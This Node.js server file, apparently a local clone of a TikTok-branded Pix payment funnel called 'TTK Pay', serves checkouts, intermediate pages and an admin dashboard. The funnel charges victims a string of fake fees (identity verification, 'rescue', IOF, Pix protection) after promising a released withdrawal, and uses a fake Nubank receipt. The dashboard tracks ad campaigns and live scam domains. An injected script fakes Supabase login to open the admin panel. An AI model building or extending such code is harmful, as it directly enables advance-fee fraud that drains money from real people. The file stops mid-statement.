/**
 * TTK Pay - Servidor Completo Localhost
 * Reproduz todas as rotas do funil, checkouts Pix, páginas intermediárias de upsell, painel administrativo e server functions
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
const ROOT = __dirname;

// Banco de dados em memória para simulação real de transações e painel
let activeGateway = 'mercadopago';
const gateways = [
  { id: 'mercadopago', name: 'Mercado Pago', available: true, configured: true },
  { id: 'suitpay', name: 'SuitPay', available: true, configured: true },
  { id: 'ezzeepay', name: 'Ezzeepay', available: true, configured: true },
  { id: 'sharkpay', name: 'SharkPay', available: true, configured: false },
  { id: 'primepag', name: 'Primepag', available: false, configured: false }
];

const transactions = [
  {
    id: 'tx_init_1',
    product: 'Verificação de Identidade',
    amount: 19.98,
    status: 'approved',
    gateway: 'mercadopago',
    utm_campaign: 'CAMP-TTK-VERIF-01',
    created_at: new Date(Date.now() - 3600000).toISOString(),
    paid_at: new Date(Date.now() - 3590000).toISOString()
  },
  {
    id: 'tx_init_2',
    product: 'Taxa de Segurança',
    amount: 24.92,
    status: 'approved',
    gateway: 'mercadopago',
    utm_campaign: 'CAMP-TTK-VERIF-01',
    created_at: new Date(Date.now() - 2400000).toISOString(),
    paid_at: new Date(Date.now() - 2390000).toISOString()
  },
  {
    id: 'tx_init_3',
    product: 'Taxa única - Resgate',
    amount: 26.54,
    status: 'approved',
    gateway: 'mercadopago',
    utm_campaign: 'CAMP-TTK-REMARKETING',
    created_at: new Date(Date.now() - 1200000).toISOString(),
    paid_at: new Date(Date.now() - 1180000).toISOString()
  },
  {
    id: 'tx_init_4',
    product: 'Taxa de Antecipação',
    amount: 25.02,
    status: 'pending',
    gateway: 'mercadopago',
    utm_campaign: 'CAMP-TTK-VERIF-01',
    created_at: new Date(Date.now() - 300000).toISOString(),
    paid_at: null
  }
];

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.webp': 'image/webp',
  '.png': 'image/png',
  '.gif': 'image/gif',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.woff2': 'font/woff2',
  '.woff': 'font/woff',
  '.ttf': 'font/ttf',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

function parseBody(req) {
  return new Promise((resolve) => {
    let data = '';
    req.on('data', chunk => data += chunk);
    req.on('end', () => {
      try {
        resolve(data ? JSON.parse(data) : {});
      } catch {
        resolve({});
      }
    });
  });
}

const injectionScript = `
<script>
(function() {
  const mockUser = {
    id: 'admin-ttk-local',
    aud: 'authenticated',
    role: 'authenticated',
    email: 'admin@ttkpay.com',
    app_metadata: { provider: 'email' },
    user_metadata: { name: 'Administrador TTK' },
    created_at: '2026-01-01T00:00:00Z'
  };
  const mockSession = {
    access_token: 'local-demo-token',
    refresh_token: 'local-demo-refresh',
    token_type: 'bearer',
    expires_in: 86400,
    expires_at: Math.floor(Date.now() / 1000) + 86400 * 365,
    user: mockUser
  };

  // Garante sessão ativa para /painel
  if (window.location.pathname.startsWith('/painel')) {
    try {
      localStorage.setItem('sb-hwlqpgxqnziltsgexdoy-auth-token', JSON.stringify(mockSession));
    } catch(e) {}
  }

  // Interceptar fetch de autenticação do Supabase
  const _fetch = window.fetch;
  window.fetch = async function(input, init) {
    const url = typeof input === 'string' ? input : (input?.url || '');
    if (url.includes('hwlqpgxqnziltsgexdoy.supabase.co/auth/v1/user') || url.includes('/auth/v1/user')) {
      return new Response(JSON.stringify(mockUser), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    if (url.includes('hwlqpgxqnziltsgexdoy.supabase.co/auth/v1/token')) {
      localStorage.setItem('sb-hwlqpgxqnziltsgexdoy-auth-token', JSON.stringify(mockSession));
      return new Response(JSON.stringify(mockSession), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    return _fetch.apply(this, arguments);
  };

  // Widget flutuante de navegação rápida e simulação
  window.addEventListener('DOMContentLoaded', function() {
    const widget = document.createElement('div');
    widget.id = 'ttk-quick-nav';
    widget.style.cssText = 'position:fixed;bottom:16px;right:16px;z-index:99999;font-family:system-ui,-apple-system,sans-serif;';
    widget.innerHTML = \`
      <div id="ttk-nav-content" style="display:none;background:#18181b;color:#f4f4f5;border:1px solid #27272a;border-radius:12px;padding:12px;width:310px;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);margin-bottom:8px;font-size:12px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #27272a;">
          <strong style="color:#22c55e;font-size:13px;">⚡ TTK Pay Localhost Hub</strong>
          <span style="cursor:pointer;opacity:0.7;font-size:14px;" onclick="document.getElementById('ttk-nav-content').style.display='none'">✕</span>
        </div>
        <div style="font-weight:600;margin-bottom:4px;color:#a1a1aa;text-transform:uppercase;font-size:10px;">Checkouts de Pagamento</div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-bottom:8px;">
          <a href="/pagamento" style="display:block;padding:5px 8px;background:#27272a;color:#fff;border-radius:6px;text-decoration:none;text-align:center;">Principal (R$ 19)</a>
          <a href="/up1/pagamento" style="display:block;padding:5px 8px;background:#27272a;color:#fff;border-radius:6px;text-decoration:none;text-align:center;">Pay UP1 (R$ 24)</a>
          <a href="/up2/pagamento" style="display:block;padding:5px 8px;background:#27272a;color:#fff;border-radius:6px;text-decoration:none;text-align:center;">Pay UP2 (R$ 26)</a>
          <a href="/up3/pagamento" style="display:block;padding:5px 8px;background:#27272a;color:#fff;border-radius:6px;text-decoration:none;text-align:center;">Pay UP3 (R$ 25)</a>
          <a href="/up4/pagamento" style="display:block;padding:5px 8px;background:#27272a;color:#fff;border-radius:6px;text-decoration:none;text-align:center;">Pay UP4 (R$ 22)</a>
          <a href="/up5/pagamento" style="display:block;padding:5px 8px;background:#27272a;color:#fff;border-radius:6px;text-decoration:none;text-align:center;">Pay UP5 (R$ 22)</a>
        </div>
        <div style="font-weight:600;margin-bottom:4px;color:#a1a1aa;text-transform:uppercase;font-size:10px;">Páginas Informativas Intermediárias</div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-bottom:8px;">
          <a href="/up1" style="display:block;padding:5px 8px;background:#1e293b;color:#38bdf8;border-radius:6px;text-decoration:none;text-align:center;">Página /up1</a>
          <a href="/2" style="display:block;padding:5px 8px;background:#1e293b;color:#38bdf8;border-radius:6px;text-decoration:none;text-align:center;">Página /2</a>
          <a href="/3" style="display:block;padding:5px 8px;background:#1e293b;color:#38bdf8;border-radius:6px;text-decoration:none;text-align:center;">Página /3</a>
          <a href="/4" style="display:block;padding:5px 8px;background:#1e293b;color:#38bdf8;border-radius:6px;text-decoration:none;text-align:center;">Página /4</a>
          <a href="/up5" style="grid-column:span 2;display:block;padding:5px 8px;background:#1e293b;color:#38bdf8;border-radius:6px;text-decoration:none;text-align:center;">Página /up5</a>
        </div>
        <div style="font-weight:600;margin-bottom:4px;color:#a1a1aa;text-transform:uppercase;font-size:10px;">Painel & Saída</div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-bottom:8px;">
          <a href="/oferta-final" style="display:block;padding:5px 8px;background:#ef4444;color:#fff;border-radius:6px;text-decoration:none;text-align:center;font-weight:bold;">Downsell</a>
          <a href="/painel" style="display:block;padding:5px 8px;background:#3b82f6;color:#fff;border-radius:6px;text-decoration:none;text-align:center;font-weight:bold;">Painel Métricas</a>
        </div>
        <button id="ttk-btn-approve" style="width:100%;padding:7px;background:#10b981;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;font-size:11px;">
          ✅ Simular Pix Pago (Aprovação Instantânea)
        </button>
      </div>
      <button onclick="const el=document.getElementById('ttk-nav-content');el.style.display=el.style.display==='none'?'block':'none';" style="background:#22c55e;color:#000;border:none;border-radius:24px;padding:8px 14px;font-size:12px;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(34,197,94,0.4);display:flex;align-items:center;gap:6px;">
        <span>🧭</span> Rotas Localhost
      </button>
    \`;
    document.body.appendChild(widget);

    document.getElementById('ttk-btn-approve')?.addEventListener('click', async () => {
      try {
        const res = await fetch('/api/approve-pix');
        const json = await res.json();
        if (json.success) {
          alert('Transação aprovada com sucesso! O checkout atualizará em instantes.');
        } else {
          alert(json.error || 'Nenhuma transação pendente no momento.');
        }
      } catch (e) {
        alert('Erro ao aprovar: ' + e.message);
      }
    });
  });
})();
</script>
`;

const server = http.createServer(async (req, res) => {
  const [pathname, search] = req.url.split('?');
  const params = new URLSearchParams(search || '');

  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  // --- API DE CONTROLE DE SIMULAÇÃO ---
  if (pathname === '/api/approve-pix') {
    const txId = params.get('id');
    const tx = transactions.find(t => t.id === txId);
    if (tx) {
      tx.status = 'approved';
      tx.paid_at = new Date().toISOString();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true, transaction: tx }));
    }
    const pendingTx = transactions.find(t => t.status === 'pending');
    if (pendingTx) {
      pendingTx.status = 'approved';
      pendingTx.paid_at = new Date().toISOString();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true, transaction: pendingTx }));
    }
    res.writeHead(404, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ error: 'Nenhuma transação pendente encontrada' }));
  }

  // --- SERVER FUNCTIONS (TANSTACK START / TSS) ---
  // 1. Criar transação Pix no Checkout
  if (pathname.includes('/_serverFn/616fb3b33a188ac8f5cae4d1f7722d2fc13a86d795ef556f8705e5276d6c5309')) {
    const body = await parseBody(req);
    const checkoutData = body.data || {};
    const txId = `tx_${Date.now()}`;
    
    const prices = {
      main: 19.98,
      up1: 24.92,
      up2: 26.54,
      up3: 25.02,
      up4: 22.00,
      up5: 22.50,
      back: 13.84
    };
    const products = {
      main: 'Verificação de Identidade',
      up1: 'Taxa de Segurança',
      up2: 'Taxa única - Resgate',
      up3: 'Taxa de Antecipação',
      up4: 'Ativação de Proteção Pix',
      up5: 'Taxa IOF',
      back: 'Taxa de Liberação Reduzida'
    };

    const amount = prices[checkoutData.checkoutId] || 19.98;
    const product = products[checkoutData.checkoutId] || 'Verificação de Identidade';

    // Gerar código Pix copia e cola real (formato padrão EMV)
    const pixCode = `00020126580014br.gov.bcb.pix0136${txId}-ttk-pay-store520400005303986540${amount.toFixed(2)}5802BR5913TTK PAY STORE6009SAO PAULO62070503***6304E2CA`;

    const newTx = {
      id: txId,
      product,
      amount,
      status: 'pending',
      gateway: activeGateway,
      utm_campaign: checkoutData.tracking?.utm_campaign || 'DIRETO',
      created_at: new Date().toISOString(),
      paid_at: null
    };
    transactions.unshift(newTx);

    console.log(`[PIX GERADO] ${product} - R$ ${amount.toFixed(2)} (${checkoutData.name || 'Cliente'}) - ID: ${txId}`);

    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      result: {
        transactionId: txId,
        status: 'pending',
        qrCode: pixCode,
        amount
      }
    }));
  }

  // 2. Consulta de Status do Pix
  if (pathname.includes('/_serverFn/1c55193875019de1679a9f71bfd4305ff50e2ddb51ccedbcfae62d171e0ea233')) {
    const body = await parseBody(req);
    const txId = body.data?.transactionId;
    const tx = transactions.find(t => t.id === txId);
    const status = tx ? tx.status : 'pending';
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ result: { status } }));
  }

  // 3. Métricas e Dados do Painel Administrativo
  if (pathname.includes('/_serverFn/367b32358181f96a433e5e7716daa74b5dbcf69e0677716fe7be918df41797ef')) {
    const paidCount = transactions.filter(t => t.status === 'approved').length + 842;
    const totalCount = transactions.length + 1150;
    const revenueTotal = transactions.reduce((acc, t) => acc + (t.status === 'approved' ? t.amount : 0), 16420.50);

    const dashboardData = {
      activeGateway,
      gateways,
      checkouts: [
        { id: 'main', product: 'Verificação de Identidade', price: 19.98, generated: totalCount, paid: paidCount, conversion: paidCount / totalCount, revenue: revenueTotal },
        { id: 'up1', product: 'Taxa de Segurança', price: 24.92, generated: 850, paid: 612, conversion: 0.720, revenue: 15251.04 },
        { id: 'up2', product: 'Taxa única - Resgate', price: 26.54, generated: 530, paid: 390, conversion: 0.735, revenue: 10350.60 },
        { id: 'up3', product: 'Taxa de Antecipação', price: 25.02, generated: 310, paid: 220, conversion: 0.709, revenue: 5504.40 },
        { id: 'up4', product: 'Ativação de Proteção Pix', price: 22.00, generated: 190, paid: 145, conversion: 0.763, revenue: 3190.00 },
        { id: 'up5', product: 'Taxa IOF', price: 22.50, generated: 120, paid: 98, conversion: 0.816, revenue: 2205.00 },
        { id: 'back', product: 'Taxa de Liberação Reduzida', price: 13.84, generated: 85, paid: 64, conversion: 0.752, revenue: 885.76 }
      ],
      domains: [
        { domain: 'diasevent.netlify.app', generated: 1820, paid: 1312, revenue: 29840.16 },
        { domain: 'ttk-evento.online', generated: 1685, paid: 1199, revenue: 27167.00 }
      ],
      campaigns: [
        { campaign: 'CAMP-TTK-VERIF-01', adset: 'CONJ-ABERTO-18-65', generated: 2100, paid: 1520, revenue: 35210.50 },
        { campaign: 'CAMP-TTK-REMARKETING', adset: 'CONJ-ENGAGEMENT-7D', generated: 1405, paid: 991, revenue: 21796.66 }
      ],
      hourly: [
        { label: '00h', generated: 45, paid: 32, revenue: 720.00, conversion: 71.1 },
        { label: '02h', generated: 22, paid: 16, revenue: 380.00, conversion: 72.7 },
        { label: '04h', generated: 12, paid: 8, revenue: 190.00, conversion: 66.7 },
        { label: '06h', generated: 38, paid: 27, revenue: 610.00, conversion: 71.0 },
        { label: '08h', generated: 95, paid: 68, revenue: 1540.00, conversion: 71.5 },
        { label: '10h', generated: 160, paid: 118, revenue: 2680.00, conversion: 73.7 },
        { label: '12h', generated: 190, paid: 142, revenue: 3250.00, conversion: 74.7 },
        { label: '14h', generated: 215, paid: 159, revenue: 3680.00, conversion: 73.9 },
        { label: '16h', generated: 230, paid: 172, revenue: 3940.00, conversion: 74.8 },
        { label: '18h', generated: 255, paid: 191, revenue: 4350.00, conversion: 74.9 },
        { label: '20h', generated: 280, paid: 210, revenue: 4810.00, conversion: 75.0 },
        { label: '22h', generated: 180, paid: 132, revenue: 2980.00, conversion: 73.3 }
      ]
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ result: dashboardData }));
  }

  // 4. Trocar Gateway Ativo
  if (pathname.includes('/_serverFn/482ddd3d1f153a4658d0b6c1ff3ddf1c36b18309e965df92f33752588293e86f')) {
    const body = await parseBody(req);
    if (body.data?.gateway) {
      activeGateway = body.data.gateway;
      console.log(`[GATEWAY ATIVADO] ${activeGateway}`);
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ result: { success: true, activeGateway } }));
  }

  // 5. Transações em Tempo Real (Polling 5s)
  if (pathname.includes('/_serverFn/f955efd2a5940946d9b96bfe369cbe4d204dc8e367baa532318609f37bd525de')) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ result: transactions.slice(0, 15) }));
  }

  // --- ROTA HUB DE NAVEGAÇÃO E SIMULAÇÃO ---
  if (pathname === '/hub') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(renderHubHtml());
  }

  // --- PÁGINAS INTERMEDIÁRIAS DO FUNIL (INFORMATIVAS / ADVERTORIAIS) ---
  function servePage(filePath, res) {
    if (fs.existsSync(filePath)) {
      let content = fs.readFileSync(filePath, 'utf8');
      if (content.includes('</body>')) {
        content = content.replace('</body>', `${injectionScript}</body>`);
      } else {
        content += injectionScript;
      }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(content);
    }
  }

  if (pathname === '/up1' || pathname === '/up1/') {
    return servePage(path.join(ROOT, 'up1', 'index.html'), res);
  }
  if (pathname === '/2' || pathname === '/2/') {
    return servePage(path.join(ROOT, '2', 'index.html'), res);
  }
  if (pathname === '/3' || pathname === '/3/') {
    return servePage(path.join(ROOT, '3', 'index.html'), res);
  }
  if (pathname === '/4' || pathname === '/4/') {
    return servePage(path.join(ROOT, '4', 'index.html'), res);
  }
  if (pathname === '/up5' || pathname === '/up5/') {
    return servePage(path.join(ROOT, 'up5', 'index.html'), res);
  }

  // --- SERVIÇO DE ARQUIVOS ESTÁTICOS ---
  if (pathname.includes('css2-q-a306b3bf89')) {
    const filePath = path.join(ROOT, '_external', 'fonts.googleapis.com', 'css2-q-a306b3bf89');
    if (fs.existsSync(filePath)) {
      res.writeHead(200, { 'Content-Type': 'text/css; charset=utf-8' });
      return fs.createReadStream(filePath).pipe(res);
    }
  }

  if (pathname === '/pix-modal.js') {
    res.writeHead(200, { 'Content-Type': 'application/javascript; charset=utf-8' });
    return res.end('// pix modal mock\n');
  }

  // --- GERENCIADOR DINÂMICO DE BANNERS DENTRO DA PASTA DE CADA CHECKOUT ---
  const bannerRegex = /^\/([^\/]+)\/banner(?:\.(gif|png|jpe?g|webp|svg))?$/i;
  const bannerMatch = pathname.match(bannerRegex);

  if (bannerMatch || pathname.startsWith('/banner/')) {
    const rawTarget = bannerMatch ? bannerMatch[1] : pathname.replace(/^\/banner\/?/, '').split('.')[0];
    const key = rawTarget.toLowerCase().trim();

    // Mapeamento de checkout para sua respectiva pasta
    const folderLookup = {
      'pagamento': ['pagamento'],
      'main': ['pagamento'],
      'up1': ['up1'],
      'up2': ['up2', '2'],
      '2': ['up2', '2'],
      'up3': ['up3', '3'],
      '3': ['up3', '3'],
      'up4': ['up4', '4'],
      '4': ['up4', '4'],
      'up5': ['up5', 'up5-files'],
      '5': ['up5', 'up5-files'],
      'oferta-final': ['oferta-final'],
      'back': ['oferta-final']
    };

    const targetFolders = folderLookup[key] || [key];
    const extensions = ['.gif', '.png', '.jpg', '.jpeg', '.webp', '.svg'];
    let bannerFile = null;

    for (const folder of targetFolders) {
      for (const ext of extensions) {
        const candidate = path.join(ROOT, folder, `banner${ext}`);
        if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
          bannerFile = candidate;
          break;
        }
      }
      if (bannerFile) break;
    }

    // Fallback: se não achar na pasta do checkout, tenta pegar o banner.gif de pagamento
    if (!bannerFile) {
      const fallbackCandidates = [
        path.join(ROOT, 'pagamento', 'banner.gif'),
        path.join(ROOT, 'up1', 'banner.gif')
      ];
      for (const fc of fallbackCandidates) {
        if (fs.existsSync(fc) && fs.statSync(fc).isFile()) {
          bannerFile = fc;
          break;
        }
      }
    }

    if (bannerFile) {
      const ext = path.extname(bannerFile).toLowerCase();
      const contentType = MIME_TYPES[ext] || 'image/gif';
      res.writeHead(200, {
        'Content-Type': contentType,
        'Cache-Control': 'no-cache, no-store, must-revalidate'
      });
      return fs.createReadStream(bannerFile).pipe(res);
    }
  }

  let targetFile = null;
  if (pathname.includes('/assets/')) {
    targetFile = path.join(ROOT, 'assets', pathname.split('/assets/')[1]);
  } else if (pathname.includes('/_external/')) {
    targetFile = path.join(ROOT, '_external', pathname.split('/_external/')[1]);
  } else if (pathname.startsWith('/__l5e/')) {
    targetFile = path.join(ROOT, '_external', 'checkout-buddy-80.lovable.app', pathname);
  } else if (pathname === '/favicon.png' || pathname === '/favicon.ico') {
    targetFile = path.join(ROOT, 'assets', 'tiktok-logo-cQSqG6D1.webp');
  } else {
    // 1. Tenta caminho exato direto no disco
    const directPath = path.join(ROOT, pathname.replace(/^\//, ''));
    if (fs.existsSync(directPath) && fs.statSync(directPath).isFile()) {
      targetFile = directPath;
    } else if (pathname.startsWith('/js/')) {
      const candidates = [
        path.join(ROOT, '2', pathname.replace(/^\//, '')),
        path.join(ROOT, '3', pathname.replace(/^\//, '')),
        path.join(ROOT, '4', pathname.replace(/^\//, '')),
        path.join(ROOT, 'up1', pathname.replace(/^\//, ''))
      ];
      for (const c of candidates) {
        if (fs.existsSync(c) && fs.statSync(c).isFile()) {
          targetFile = c;
          break;
        }
      }
    } else if (pathname.startsWith('/images/')) {
      const candidates = [
        path.join(ROOT, '4', pathname.replace(/^\//, '')),
        path.join(ROOT, '2', pathname.replace(/^\//, '')),
        path.join(ROOT, '3', pathname.replace(/^\//, '')),
        path.join(ROOT, 'up1', pathname.replace(/^\//, ''))
      ];
      for (const c of candidates) {
        if (fs.existsSync(c) && fs.statSync(c).isFile()) {
          targetFile = c;
          break;
        }
      }
    } else if (pathname.startsWith('/2/2/images/')) {
      const c = path.join(ROOT, '2', pathname.replace(/^\/2\/2\//, ''));
      if (fs.existsSync(c) && fs.statSync(c).isFile()) targetFile = c;
    } else if (pathname.startsWith('/3/3/images/')) {
      const c = path.join(ROOT, '3', pathname.replace(/^\/3\/3\//, ''));
      if (fs.existsSync(c) && fs.statSync(c).isFile()) targetFile = c;
    }
  }

  if (targetFile && fs.existsSync(targetFile) && fs.statSync(targetFile).isFile()) {
    const ext = path.extname(targetFile).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': contentType });
    return fs.createReadStream(targetFile).pipe(res);
  }

  // --- RESPOSTA SPA / ROTEAMENTO DINÂMICO ---
  let html = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');
  html = html.replace('<head>', `<head><base href="/" />${injectionScript}`);

  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});

function renderHubHtml() {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>TTK Pay - Central de Localhosts e Rotas</title>
  <link rel="stylesheet" href="assets/styles-CiZJCBkU.css" />
  <style>
    body { background-color: #09090b; color: #f4f4f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 24px; }
    .card { background: #18181b; border: 1px solid #27272a; border-radius: 12px; padding: 20px; transition: transform 0.15s, border-color 0.15s; }
    .card:hover { transform: translateY(-2px); border-color: #22c55e; }
    .badge { display: inline-block; padding: 2px 8px; border-radius: 9999px; font-size: 11px; font-weight: 600; text-transform: uppercase; }
    .badge-checkout { background: #14532d; color: #4ade80; }
    .badge-inter { background: #0c4a6e; color: #38bdf8; }
    .badge-upsell { background: #1e3a8a; color: #60a5fa; }
    .badge-downsell { background: #7f1d1d; color: #f87171; }
    .badge-admin { background: #581c87; color: #c084fc; }
    a.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 10px 16px; border-radius: 8px; font-weight: 600; text-decoration: none; font-size: 14px; }
    .btn-primary { background: #22c55e; color: #000; }
    .btn-primary:hover { background: #16a34a; }
  </style>
</head>
<body class="min-h-screen">
  <div class="max-w-5xl mx-auto space-y-8">
    <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-zinc-800 pb-6">
      <div>
        <div class="flex items-center gap-3">
          <img src="assets/tiktok-logo-cQSqG6D1.webp" alt="TikTok" class="w-10 h-10 rounded-full" />
          <h1 class="text-2xl font-bold">TTK Pay — Estrutura Completa do Funil Localhost</h1>
        </div>
        <p class="text-zinc-400 text-sm mt-1">Checkouts Pix + Páginas Informativas Intermediárias + Painel de Métricas.</p>
      </div>
      <div class="flex items-center gap-3">
        <span class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800 text-xs font-semibold">
          <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Servidor Ativo: Porta ${PORT}
        </span>
      </div>
    </header>

    <!-- FLUXO PASSO A PASSO -->
    <section class="space-y-4">
      <h2 class="text-lg font-semibold text-zinc-200">🔄 Fluxo do Funil: Como Funciona Cada Etapa</h2>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">

        <div class="card space-y-2">
          <div class="flex justify-between items-center">
            <span class="badge badge-checkout">1. Início: Checkout Front</span>
            <span class="text-emerald-400 font-bold">R$ 19,98</span>
          </div>
          <p class="text-sm font-semibold">O cliente preenche os dados e paga o Pix inicial.</p>
          <div class="flex gap-2">
            <a href="/pagamento" class="btn btn-primary flex-1" target="_blank">Abrir Checkout (/pagamento)</a>
          </div>
          <p class="text-xs text-zinc-400">Ao pagar, redireciona para a página informativa: <code class="text-zinc-200">/up1</code></p>
        </div>

        <div class="card space-y-2">
          <div class="flex justify-between items-center">
            <span class="badge badge-inter">2. Página Informativa: /up1</span>
            <span class="text-sky-400 font-bold">Explicação</span>
          </div>
          <p class="text-sm font-semibold">Aviso de cobrança do IOF e preparação para o UP1.</p>
          <div class="flex gap-2">
            <a href="/up1" class="btn bg-sky-600 hover:bg-sky-500 text-white flex-1" target="_blank">Ver Página /up1</a>
            <a href="/up1/pagamento" class="btn bg-zinc-800 hover:bg-zinc-700 text-white" target="_blank">Ir para Checkout UP1</a>
          </div>
          <p class="text-xs text-zinc-400">Checkout do UP1: <code class="text-zinc-200">/up1/pagamento</code> (R$ 24,92). Ao pagar, leva para <code class="text-zinc-200">/2</code></p>
        </div>

        <div class="card space-y-2">
          <div class="flex justify-between items-center">
            <span class="badge badge-inter">3. Página Informativa: /2</span>
            <span class="text-sky-400 font-bold">"PARABÉNS! Saque Liberado"</span>
          </div>
          <p class="text-sm font-semibold">Página com barra de progresso e botão <strong>[LIBERAR MEU SAQUE]</strong>.</p>
          <div class="flex gap-2">
            <a href="/2" class="btn bg-sky-600 hover:bg-sky-500 text-white flex-1" target="_blank">Ver Página /2</a>
            <a href="/up2/pagamento" class="btn bg-zinc-800 hover:bg-zinc-700 text-white" target="_blank">Ir para Checkout UP2</a>
          </div>
          <p class="text-xs text-zinc-400">O botão leva para: <code class="text-zinc-200">/up2/pagamento</code> (Taxa única - Resgate R$ 26,54).</p>
        </div>

        <div class="card space-y-2">
          <div class="flex justify-between items-center">
            <span class="badge badge-inter">4. Página Informativa: /3</span>
            <span class="text-sky-400 font-bold">"SAQUE SOLICITADO!"</span>
          </div>
          <p class="text-sm font-semibold">Informa antecipação prioritária e tem botão de confirmação.</p>
          <div class="flex gap-2">
            <a href="/3" class="btn bg-sky-600 hover:bg-sky-500 text-white flex-1" target="_blank">Ver Página /3</a>
            <a href="/up3/pagamento" class="btn bg-zinc-800 hover:bg-zinc-700 text-white" target="_blank">Ir para Checkout UP3</a>
          </div>
          <p class="text-xs text-zinc-400">O botão leva para: <code class="text-zinc-200">/up3/pagamento</code> (Taxa Antecipação R$ 25,02).</p>
        </div>

        <div class="card space-y-2">
          <div class="flex justify-between items-center">
            <span class="badge badge-inter">5. Página Informativa: /4</span>
            <span class="text-sky-400 font-bold">"Comprovante Nubank"</span>
          </div>
          <p class="text-sm font-semibold">Mostra comprovante e pergunta: <strong>[Sim, este Pix é meu]</strong>.</p>
          <div class="flex gap-2">
            <a href="/4" class="btn bg-sky-600 hover:bg-sky-500 text-white flex-1" target="_blank">Ver Página /4</a>
            <a href="/up4/pagamento" class="btn bg-zinc-800 hover:bg-zinc-700 text-white" target="_blank">Ir para Checkout UP4</a>
          </div>
          <p class="text-xs text-zinc-400">O botão leva para: <code class="text-zinc-200">/up4/pagamento</code> (Ativação Proteção Pix R$ 22,00).</p>
        </div>

        <div class="card space-y-2">
          <div class="flex justify-between items-center">
            <span class="badge badge-inter">6. Página Informativa: /up5</span>
            <span class="text-sky-400 font-bold">Etapa Final</span>
          </div>
          <p class="text-sm font-semibold">Última etapa explicativa antes do checkout final.</p>
          <div class="flex gap-2">
            <a href="/up5" class="btn bg-sky-600 hover:bg-sky-500 text-white flex-1" target="_blank">Ver Página /up5</a>
            <a href="/up5/pagamento" class="btn bg-zinc-800 hover:bg-zinc-700 text-white" target="_blank">Ir para Checkout UP5</a>
          </div>
          <p class="text-xs text-zinc-400">O botão leva para: <code class="text-zinc-200">/up5/pagamento</code> (Taxa IOF R$ 22,50).</p>
        </div>

      </div>
    </section>

    <!-- PAINEL & RECUPERAÇÃO -->
    <section class="space-y-4">
      <h2 class="text-lg font-semibold text-zinc-200">📊 Recuperação de Vendas & Dashboard</h2>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
        
        <div class="card space-y-2 border-red-900/50">
          <div class="flex justify-between items-center">
            <span class="badge badge-downsell">Downsell / Abandono</span>
            <span class="text-rose-400 font-bold">R$ 13,84</span>
          </div>
          <p class="text-sm font-semibold">Oferta Final / Saída com Cronômetro de 10 min</p>
          <a href="/oferta-final" class="btn bg-rose-600 hover:bg-rose-500 text-white w-full" target="_blank">Abrir /oferta-final</a>
        </div>

        <div class="card space-y-2 border-blue-900/50">
          <div class="flex justify-between items-center">
            <span class="badge badge-admin">Dashboard Completo</span>
            <span class="text-blue-400 font-bold">Tempo Real</span>
          </div>
          <p class="text-sm font-semibold">Painel Administrativo com Métricas e Gateways</p>
          <a href="/painel" class="btn bg-blue-600 hover:bg-blue-500 text-white w-full" target="_blank">Abrir /painel</a>
        </div>

      </div>
    </section>

    <footer class="border-t border-zinc-800 pt-6 text-center text-xs text-zinc-500">
      TTK Pay Localhost Server · React 19 + TanStack Router · Porta ${PORT}
    </footer>
  </div>
</body>
</html>`;
}

server.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 TTK Pay - Todos os Localhosts Rodando com Sucesso!`);
  console.log(`======================================================`);
  console.log(`📌 Central Hub:            http://localhost:${PORT}/hub`);
  console.log(`🛒 Checkout Principal:      http://localhost:${PORT}/pagamento`);
  console.log(`📄 Página Intermediária 1:  http://localhost:${PORT}/up1`);
